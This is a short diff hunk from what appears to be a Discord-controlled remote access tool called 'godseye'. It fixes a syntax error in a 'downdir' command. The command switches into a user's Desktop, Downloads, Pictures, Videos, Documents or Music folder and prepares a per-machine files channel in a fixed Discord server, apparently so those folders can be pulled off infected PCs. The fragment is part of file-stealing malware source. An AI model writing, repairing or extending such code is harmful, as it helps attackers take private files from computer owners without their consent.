@@ -223,7 +223,7 @@ async def downdir(ctx,arg):
     #only supports main dirs, pics, desktop, downloads etc)
     dirs=["desktop","downloads","pictures","videos","documents","music"]
     if arg in dirs:
-      os.chdir(f"C://users/{pc_username}/{arg}"
+      os.chdir(f"C://users/{pc_username}/{arg}")
       fileschan=(f"{channelname}s-files")
       channels=[]
       guild = godseye.get_guild(874824520467349504)
